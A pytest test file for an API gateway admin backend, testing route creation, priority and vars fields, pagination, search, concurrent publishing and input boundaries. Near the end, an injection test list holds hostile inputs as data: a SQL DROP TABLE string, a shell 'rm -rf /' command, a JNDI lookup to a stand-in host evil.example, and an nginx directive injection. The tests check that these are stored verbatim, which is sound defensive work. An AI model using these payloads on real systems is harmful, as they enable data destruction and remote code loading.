import pytest
from httpx import AsyncClient, ASGITransport
from app.main import app
from app.models.cluster import Route


class TestRouteAPI:

    async def test_create_route_with_priority(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": "admin", "password": "panshi123"}
            )
            assert response.status_code == 200
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            response = await client.post(
                "/api/v1/clusters/1/routes",
                headers=headers,
                json={
                    "name": "test-priority-api",
                    "uri": "/api/priority/*",
                    "priority": 50,
                    "status": 1
                }
            )
            assert response.status_code == 201
            data = response.json()
            assert data["priority"] == 50

    async def test_update_route_priority(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": "admin", "password": "panshi123"}
            )
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            response = await client.post(
                "/api/v1/clusters/1/routes",
                headers=headers,
                json={
                    "name": "update-priority-test",
                    "uri": "/api/update-priority/*",
                    "priority": 10,
                    "status": 1
                }
            )
            route_id = response.json()["id"]

            response = await client.put(
                f"/api/v1/clusters/1/routes/{route_id}",
                headers=headers,
                json={"priority": 99}
            )
            assert response.status_code == 200
            data = response.json()
            assert data["priority"] == 99

    async def test_update_route_vars_empty_array(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": "admin", "password": "panshi123"}
            )
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            response = await client.post(
                "/api/v1/clusters/1/routes",
                headers=headers,
                json={
                    "name": "test-empty-vars-api",
                    "uri": "/api/empty/*",
                    "vars": []
                }
            )
            assert response.status_code == 201
            data = response.json()
            assert data["vars"] == []

            route_id = data["id"]
            response = await client.put(
                f"/api/v1/clusters/1/routes/{route_id}",
                headers=headers,
                json={"priority": 100}
            )
            assert response.status_code == 200
            data = response.json()
            assert data["priority"] == 100
            assert data["vars"] == []

    async def test_update_route_vars_from_null_to_empty(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": "admin", "password": "panshi123"}
            )
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            response = await client.post(
                "/api/v1/clusters/1/routes",
                headers=headers,
                json={
                    "name": "test-null-vars-api",
                    "uri": "/api/null/*"
                }
            )
            assert response.status_code == 201
            data = response.json()
            assert data["vars"] is None

            route_id = data["id"]
            response = await client.put(
                f"/api/v1/clusters/1/routes/{route_id}",
                headers=headers,
                json={"vars": []}
            )
            assert response.status_code == 200
            data = response.json()
            assert data["vars"] == []

    async def test_update_route_priority_and_vars_together(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": "admin", "password": "panshi123"}
            )
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            response = await client.post(
                "/api/v1/clusters/1/routes",
                headers=headers,
                json={
                    "name": "test-both-fields",
                    "uri": "/api/both/*",
                    "priority": 5,
                    "vars": [["http_host", "==", "example.com"]]
                }
            )
            assert response.status_code == 201
            data = response.json()
            assert data["priority"] == 5
            assert data["vars"] == [["http_host", "==", "example.com"]]

            route_id = data["id"]
            response = await client.put(
                f"/api/v1/clusters/1/routes/{route_id}",
                headers=headers,
                json={
                    "priority": 888,
                    "vars": [["http_host", "==", "new.com"]]
                }
            )
            assert response.status_code == 200
            data = response.json()
            assert data["priority"] == 888
            assert data["vars"] == [["http_host", "==", "new.com"]]

    async def test_list_routes_pagination(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": "admin", "password": "panshi123"}
            )
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            response = await client.get(
                "/api/v1/clusters/1/routes",
                headers=headers,
                params={"page": 1, "page_size": 5}
            )
            assert response.status_code == 200
            data = response.json()
            assert "total" in data
            assert "page" in data
            assert "page_size" in data
            assert data["page"] == 1
            assert data["page_size"] == 5
            assert len(data["items"]) <= 5

    async def test_list_routes_sorting_asc(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": "admin", "password": "panshi123"}
            )
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            response = await client.get(
                "/api/v1/clusters/1/routes",
                headers=headers,
                params={"page": 1, "page_size": 10, "sort_by": "priority", "sort_order": "asc"}
            )
            assert response.status_code == 200
            data = response.json()
            items = data["items"]
            priorities = [item["priority"] for item in items if item.get("priority") is not None]
            assert priorities == sorted(priorities)

    async def test_list_routes_sorting_desc(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": "admin", "password": "panshi123"}
            )
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            response = await client.get(
                "/api/v1/clusters/1/routes",
                headers=headers,
                params={"page": 1, "page_size": 10, "sort_by": "priority", "sort_order": "desc"}
            )
            assert response.status_code == 200
            data = response.json()
            items = data["items"]
            priorities = [item["priority"] for item in items if item.get("priority") is not None]
            assert priorities == sorted(priorities, reverse=True)

    async def test_list_routes_search_global(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": "admin", "password": "panshi123"}
            )
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            response = await client.get(
                "/api/v1/clusters/1/routes",
                headers=headers,
                params={"page": 1, "page_size": 50, "search": "test"}
            )
            assert response.status_code == 200
            data = response.json()
            assert data["total"] <= 99999
            for item in data["items"]:
                name_match = "test" in (item.get("name") or "").lower()
                uri_match = "test" in (item.get("uri") or "").lower()
                desc_match = "test" in (item.get("description") or "").lower()
                hosts_match = "test" in (item.get("hosts") or "").lower()
                assert name_match or uri_match or desc_match or hosts_match

    async def test_list_routes_search_by_field(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": "admin", "password": "panshi123"}
            )
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            response = await client.get(
                "/api/v1/clusters/1/routes",
                headers=headers,
                params={"page": 1, "page_size": 50, "search": "test", "search_field": "name"}
            )
            assert response.status_code == 200
            data = response.json()
            for item in data["items"]:
                assert "test" in (item.get("name") or "").lower()

class TestRouteWebsocketRoundTrip:

    async def _auth_headers(self, client):
        response = await client.post(
            "/api/v1/auth/login",
            json={"username": "admin", "password": "panshi123"}
        )
        token = response.json()["access_token"]
        return {"Authorization": f"Bearer {token}"}

    async def test_create_route_with_websocket_returns_true(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            headers = await self._auth_headers(client)
            response = await client.post(
                "/api/v1/clusters/1/routes",
                headers=headers,
                json={
                    "name": "ws-roundtrip-test",
                    "uri": "/ws-roundtrip/*",
                    "enable_websocket": True
                }
            )
            assert response.status_code == 201
            data = response.json()
            assert data["enable_websocket"] is True
            route_id = data["id"]

            get_response = await client.get(
                f"/api/v1/clusters/1/routes/{route_id}",
                headers=headers
            )
            assert get_response.status_code == 200
            assert get_response.json()["enable_websocket"] is True

    async def test_update_route_websocket_false_clears(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            headers = await self._auth_headers(client)
            response = await client.post(
                "/api/v1/clusters/1/routes",
                headers=headers,
                json={
                    "name": "ws-clear-test",
                    "uri": "/ws-clear/*",
                    "enable_websocket": True
                }
            )
            route_id = response.json()["id"]

            update_response = await client.put(
                f"/api/v1/clusters/1/routes/{route_id}",
                headers=headers,
                json={"enable_websocket": False}
            )
            assert update_response.status_code == 200
            assert update_response.json()["enable_websocket"] is False

            get_response = await client.get(
                f"/api/v1/clusters/1/routes/{route_id}",
                headers=headers
            )
            assert get_response.json()["enable_websocket"] is False


class TestRouteVarsLifecycle:
    """vars 空数组/值/null 的生命周期往返（合并自 test_route_switch_toggle.py）。

    共性夹具逻辑：登录 + 建路由，返回 (headers, route_id)。
    """

    async def _login_and_create(self, client, payload):
        response = await client.post(
            "/api/v1/auth/login",
            json={"username": "admin", "password": "panshi123"},
        )
        assert response.status_code == 200
        headers = {"Authorization": f"Bearer {response.json()['access_token']}"}
        response = await client.post(
            "/api/v1/clusters/1/routes", headers=headers, json=payload
        )
        assert response.status_code == 201
        return headers, response.json()["id"]

    async def test_vars_round_trip_array_value_null(self):
        """[] → 条件值 → [] → None 全链路往返，每步回显正确。"""
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            headers, route_id = await self._login_and_create(
                client,
                {"name": "vars-round-trip", "uri": "/vars-round-trip/*", "vars": []},
            )
            base = f"/api/v1/clusters/1/routes/{route_id}"

            response = await client.put(
                base, headers=headers,
                json={"vars": [["http_host", "==", "test.com"]]},
            )
            assert response.status_code == 200
            assert response.json()["vars"] == [["http_host", "==", "test.com"]]

            response = await client.put(base, headers=headers, json={"vars": []})
            assert response.status_code == 200
            assert response.json()["vars"] == []

            response = await client.put(base, headers=headers, json={"vars": None})
            assert response.status_code == 200
            assert response.json()["vars"] is None

    async def test_priority_preserved_when_updating_vars_only(self):
        """仅更新 vars 时 priority 不得被重置。"""
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            headers, route_id = await self._login_and_create(
                client,
                {"name": "vars-only-priority", "uri": "/vars-only/*", "priority": 777},
            )
            response = await client.put(
                f"/api/v1/clusters/1/routes/{route_id}",
                headers=headers,
                json={"vars": [["arg_page", "==", "1"]]},
            )
            assert response.status_code == 200
            assert response.json()["priority"] == 777


# ── 自 test_route_advanced_match.py 并入（B4 合并）──
# 模型层（test_db + ORM）：priority/vars 字段的持久化与空数组/null 语义。


class TestRouteAdvancedMatch:

    async def test_create_route_with_priority_and_vars(self, test_db):
        route = Route(
            cluster_id=1,
            name="route-with-advanced-match",
            uri="/api/advanced/*",
            priority=10,
            vars='[["header", "Host", "==", "example.com"]]',
            status=1
        )
        test_db.add(route)
        await test_db.commit()
        await test_db.refresh(route)

        assert route.id is not None
        assert route.priority == 10
        assert route.vars is not None
        assert "example.com" in route.vars

    async def test_create_route_without_advanced_match(self, test_db):
        route = Route(
            cluster_id=1,
            name="route-basic",
            uri="/api/basic/*",
            priority=0,
            vars=None,
            status=1
        )
        test_db.add(route)
        await test_db.commit()
        await test_db.refresh(route)

        assert route.id is not None
        assert route.priority == 0
        assert route.vars is None

    async def test_update_route_disable_advanced_match(self, test_db):
        route = Route(
            cluster_id=1,
            name="route-to-disable",
            uri="/api/to-disable/*",
            priority=5,
            vars='[["header", "X-Custom", "==", "value"]]',
            status=1
        )
        test_db.add(route)
        await test_db.commit()
        await test_db.refresh(route)

        route.priority = 0
        route.vars = None
        await test_db.commit()
        await test_db.refresh(route)

        assert route.priority == 0
        assert route.vars is None

    async def test_update_route_change_priority_only(self, test_db):
        route = Route(
            cluster_id=1,
            name="route-priority-change",
            uri="/api/priority/*",
            priority=5,
            vars=None,
            status=1
        )
        test_db.add(route)
        await test_db.commit()
        await test_db.refresh(route)

        route.priority = 20
        await test_db.commit()
        await test_db.refresh(route)

        assert route.priority == 20
        assert route.vars is None

    async def test_update_route_change_vars_only(self, test_db):
        route = Route(
            cluster_id=1,
            name="route-vars-change",
            uri="/api/vars/*",
            priority=0,
            vars='[["query", "page", "==", "1"]]',
            status=1
        )
        test_db.add(route)
        await test_db.commit()
        await test_db.refresh(route)

        route.vars = '[["header", "Authorization", "~~", "Bearer"]]'
        await test_db.commit()
        await test_db.refresh(route)

        assert route.priority == 0
        assert "Authorization" in route.vars

    async def test_route_with_multiple_vars(self, test_db):
        vars_json = '[["header", "Host", "==", "api.example.com"], ["query", "version", "==", "v2"], ["cookie", "session", "!=", "invalid"]]'
        route = Route(
            cluster_id=1,
            name="route-multi-vars",
            uri="/api/multi/*",
            priority=15,
            vars=vars_json,
            status=1
        )
        test_db.add(route)
        await test_db.commit()
        await test_db.refresh(route)

        assert route.priority == 15
        assert "api.example.com" in route.vars
        assert "version" in route.vars
        assert "session" in route.vars

    async def test_route_priority_default_zero(self, test_db):
        route = Route(
            cluster_id=1,
            name="route-default-priority",
            uri="/api/default/*",
            status=1
        )
        test_db.add(route)
        await test_db.commit()
        await test_db.refresh(route)

        assert route.priority == 0

    async def test_route_vars_null_vs_empty(self, test_db):
        route_null = Route(
            cluster_id=1,
            name="route-null-vars",
            uri="/api/null-vars/*",
            vars=None,
            status=1
        )
        test_db.add(route_null)
        await test_db.commit()
        await test_db.refresh(route_null)

        route_empty = Route(
            cluster_id=1,
            name="route-empty-vars",
            uri="/api/empty-vars/*",
            vars='[]',
            status=1
        )
        test_db.add(route_empty)
        await test_db.commit()
        await test_db.refresh(route_empty)

        assert route_null.vars is None
        assert route_empty.vars == '[]'


# ── 自 test_route_priority.py 并入（B4 合并）──
# API 层：priority=0 的创建/更新边界与部分更新字段保留。


class TestRoutePriority:

    async def test_create_route_with_priority_zero(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": "admin", "password": "panshi123"}
            )
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            response = await client.post(
                "/api/v1/clusters/1/routes",
                headers=headers,
                json={
                    "name": "test-priority-zero",
                    "uri": "/test-priority-zero/*",
                    "priority": 0,
                    "status": 1
                }
            )
            assert response.status_code == 201
            data = response.json()
            assert data["priority"] == 0

    async def test_create_route_without_priority(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": "admin", "password": "panshi123"}
            )
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            response = await client.post(
                "/api/v1/clusters/1/routes",
                headers=headers,
                json={
                    "name": "test-no-priority",
                    "uri": "/test-no-priority/*",
                    "status": 1
                }
            )
            assert response.status_code == 201
            data = response.json()
            assert data["priority"] == 0

    async def test_update_priority_preserves_other_fields(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/v1/auth/login",
                json={"username": "admin", "password": "panshi123"}
            )
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            response = await client.post(
                "/api/v1/clusters/1/routes",
                headers=headers,
                json={
                    "name": "test-preserve-fields",
                    "uri": "/test-preserve/*",
                    "priority": 50,
                    "status": 1
                }
            )
            assert response.status_code == 201
            data = response.json()
            assert data["priority"] == 50
            route_id = data["id"]

            response = await client.put(
                f"/api/v1/clusters/1/routes/{route_id}",
                headers=headers,
                json={"priority": 0}
            )
            assert response.status_code == 200
            data = response.json()
            assert data["priority"] == 0
            assert data["name"] == "test-preserve-fields"
            assert data["uri"] == "/test-preserve/*"


# ── B4 lane A 新增边界/安全卡片（docs/refactoring/test-case-audit-2026-10-01 §5.3）──
# B1-NEW-04 并发双发布竞态 / B1-NEW-05 uri 透传契约 / B1-NEW-06 vars 注入 /
# B1-NEW-10（routes 半）名称边界与跨集群同名。
# 夹具：单请求用例走 async_authed_client（conftest 现行隔离夹具）；
# 并发用例沿用本文件既有的直连 ASGITransport 模式（并发请求需多连接共享
# 同一文件库，async 家族的 :memory: 库不支持）。

import asyncio
import json

from app.models.cluster import Cluster
from app.services.edge_client import EdgeClient


class TestRouteConcurrentDoublePublish:
    """B1-NEW-04：同一路由并发双发布不得产生竞态损坏。

    损坏定义：ps_config_version 出现重复版本号（create_config_version 的
    read-max-then-insert 无唯一约束兜底），或版本行数与发布次数不一致。
    预期：两路发布均 200，版本号互异（[1, 2]），current_version 取最大。
    """

    async def _auth_headers(self, client):
        response = await client.post(
            "/api/v1/auth/login",
            json={"username": "admin", "password": "panshi123"},
        )
        assert response.status_code == 200
        return {"Authorization": f"Bearer {response.json()['access_token']}"}

    async def test_same_route_concurrent_double_publish_versions_not_corrupted(self):
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            headers = await self._auth_headers(client)
            resp = await client.post(
                "/api/v1/clusters/1/routes",
                headers=headers,
                json={"name": "concurrent-publish-route", "uri": "/concurrent-publish/*"},
            )
            assert resp.status_code == 201, resp.text
            route_id = resp.json()["id"]

            r1, r2 = await asyncio.gather(
                client.post(f"/api/v1/clusters/1/routes/{route_id}/publish", headers=headers),
                client.post(f"/api/v1/clusters/1/routes/{route_id}/publish", headers=headers),
            )
            assert r1.status_code == 200, r1.text
            assert r2.status_code == 200, r2.text

            hist = await client.get(
                f"/api/v1/clusters/1/routes/{route_id}/history", headers=headers
            )
            assert hist.status_code == 200
            data = hist.json()
            assert data["total"] == 2, f"版本行数应为 2（发布两次），实际 {data['total']}"
            versions = sorted(item["version"] for item in data["items"])
            assert versions == [1, 2], f"并发双发布产生竞态损坏，版本号重复：{versions}"
            assert data["current_version"] == 2


class TestRouteUriBoundaryAndPassthrough:
    """B1-NEW-05：uri 合法性边界 + radixtree 透传契约（约定 #22）。

    平台侧只存储/透传 uri 原文，不做归一化、不补 `/*`、不做裸路径兼容；
    `X/*` 不匹配裸 `X` 的匹配语义由 Edge 实现（不可达，不在断言范围）。
    """

    @pytest.mark.parametrize(
        "uri",
        ["/x/*", "/x", "/ws/", "/svc/api/*/end", "/abs/[0-9]+/seg"],
        ids=["wildcard", "bare-path", "trailing-slash", "mid-wildcard", "regex-style"],
    )
    async def test_radixtree_style_uris_stored_verbatim(self, async_authed_client, uri):
        name = "uri-verbatim" + uri.replace("/", "-")
        resp = await async_authed_client.post(
            "/api/v1/clusters/1/routes",
            json={"name": name, "uri": uri},
        )
        assert resp.status_code == 201, resp.text
        assert resp.json()["uri"] == uri

        got = await async_authed_client.get(f"/api/v1/clusters/1/routes/{resp.json()['id']}")
        assert got.status_code == 200
        assert got.json()["uri"] == uri

    @pytest.mark.parametrize("uri_len, expected_status", [(500, 201), (501, 422)])
    async def test_uri_length_boundary(self, async_authed_client, uri_len, expected_status):
        uri = "/" + "a" * (uri_len - 1)
        resp = await async_authed_client.post(
            "/api/v1/clusters/1/routes",
            json={"name": f"uri-len-{uri_len}", "uri": uri},
        )
        assert resp.status_code == expected_status, resp.text
        if expected_status == 201:
            assert resp.json()["uri"] == uri

    async def test_publish_uri_passthrough_contract(self, async_authed_client):
        """发布链路（版本快照 + Edge 载荷组装）逐字透传 uri，不改写。"""
        resp = await async_authed_client.post(
            "/api/v1/clusters/1/routes",
            json={"name": "uri-passthrough-pub", "uri": "/ws/"},
        )
        assert resp.status_code == 201, resp.text
        route_id = resp.json()["id"]

        pub = await async_authed_client.post(f"/api/v1/clusters/1/routes/{route_id}/publish")
        assert pub.status_code == 200, pub.text
        assert pub.json()["status"] == "ok"  # 集群无活跃节点 → 跳过逐节点推送

        hist = await async_authed_client.get(f"/api/v1/clusters/1/routes/{route_id}/history")
        assert hist.status_code == 200
        items = hist.json()["items"]
        assert len(items) == 1
        assert json.loads(items[0]["config"])["uri"] == "/ws/"

        # Edge 载荷组装（纯函数）：uri 原样进载荷，不追加 /*、不补斜杠
        edge = EdgeClient.convert_route_to_edge_format(
            edge_uuid="u", name="n", uri="/x", methods=None, hosts=None,
            upstream_edge_uuid=None, priority=0, vars_json=None, plugins=None,
        )
        assert edge["uri"] == "/x"


INJECTION_VARS = [
    ("sql", ["arg_cmd", "==", "'; DROP TABLE ps_route; --"]),
    ("shell", ["arg_x", "==", "1; rm -rf /"]),
    ("jndi", ["header", "X-Exp", "==", "${jndi:ldap://evil.example/a}"]),
    ("nginx-directive", ["arg_ngx", "~~", "}}; access_log /tmp/pwned;"]),
    ("control-chars", ["arg_multi", "==", "line1\nline2\ttab"]),
]


class TestRouteVarsInjectionSafety:
    """B1-NEW-06：vars 注入向量全程作为不透明 JSON 数据存储/透传。

    三段链路逐字保真（无求值/插值/执行副作用）：
    存储回显（GET）→ 版本快照（history config）→ Edge 载荷（convert 静态映射）。
    """

    @pytest.mark.parametrize(
        "expr", [e for _, e in INJECTION_VARS], ids=[k for k, _ in INJECTION_VARS]
    )
    async def test_injection_vector_stays_opaque_data(self, async_authed_client, expr):
        payload = [expr]
        resp = await async_authed_client.post(
            "/api/v1/clusters/1/routes",
            json={"name": f"vars-inj-{expr[0]}", "uri": "/vars-inj/*", "vars": payload},
        )
        assert resp.status_code == 201, resp.text
        assert resp.json()["vars"] == payload
        route_id = resp.json()["id"]

        got = await async_authed_client.get(f"/api/v1/clusters/1/routes/{route_id}")
        assert got.status_code == 200
        assert got.json()["vars"] == payload

        pub = await async_authed_client.post(f"/api/v1/clusters/1/routes/{route_id}/publish")
        assert pub.status_code == 200, pub.text

        hist = await async_authed_client.get(f"/api/v1/clusters/1/routes/{route_id}/history")
        assert hist.status_code == 200
        snapshot = json.loads(hist.json()["items"][0]["config"])
        assert snapshot["vars"] == payload

        edge = EdgeClient.convert_route_to_edge_format(
            edge_uuid="u", name="n", uri="/x", methods=None, hosts=None,
            upstream_edge_uuid=None, priority=0, vars_json=json.dumps(payload),
            plugins=None,
        )
        assert edge["vars"] == payload

        final = await async_authed_client.get(f"/api/v1/clusters/1/routes/{route_id}")
        assert final.status_code == 200  # "DROP TABLE" 类载荷未影响资源可读性


class TestRouteNameBoundary:
    """B1-NEW-10（routes 半）：名称长度边界、特殊字符保真、跨集群同名允许。"""

    @pytest.mark.parametrize("name, expected_status", [("a" * 100, 201), ("a" * 101, 422), ("", 422)])
    async def test_name_length_boundary(self, async_authed_client, name, expected_status):
        resp = await async_authed_client.post(
            "/api/v1/clusters/1/routes",
            json={"name": name, "uri": "/name-boundary/*"},
        )
        assert resp.status_code == expected_status, resp.text
        if expected_status == 201:
            assert resp.json()["name"] == name

    @pytest.mark.parametrize(
        "name",
        ["中文-路由 & <网关>", "name with spaces", "a-b_c.d~!@#$%^&*()"],
    )
    async def test_name_special_chars_stored_verbatim(self, async_authed_client, name):
        resp = await async_authed_client.post(
            "/api/v1/clusters/1/routes",
            json={"name": name, "uri": "/name-special/*"},
        )
        assert resp.status_code == 201, resp.text
        assert resp.json()["name"] == name

        got = await async_authed_client.get(f"/api/v1/clusters/1/routes/{resp.json()['id']}")
        assert got.status_code == 200
        assert got.json()["name"] == name

    async def test_same_name_across_clusters_allowed(self, async_authed_client, isolated_session):
        async with isolated_session() as s:
            s.add(Cluster(id=21001, name="name-boundary-second-cluster"))
            await s.commit()

        resp1 = await async_authed_client.post(
            "/api/v1/clusters/1/routes",
            json={"name": "cross-cluster-dup-name", "uri": "/dup-name-c1/*"},
        )
        resp2 = await async_authed_client.post(
            "/api/v1/clusters/21001/routes",
            json={"name": "cross-cluster-dup-name", "uri": "/dup-name-c2/*"},
        )
        assert resp1.status_code == 201, resp1.text
        assert resp2.status_code == 201, resp2.text
        assert resp1.json()["cluster_id"] == 1
        assert resp2.json()["cluster_id"] == 21001

        list1 = await async_authed_client.get(
            "/api/v1/clusters/1/routes", params={"search": "cross-cluster-dup-name"}
        )
        list2 = await async_authed_client.get(
            "/api/v1/clusters/21001/routes", params={"search": "cross-cluster-dup-name"}
        )
        assert list1.status_code == 200
        assert list2.status_code == 200
        assert list1.json()["total"] == 1
        assert list2.json()["total"] == 1
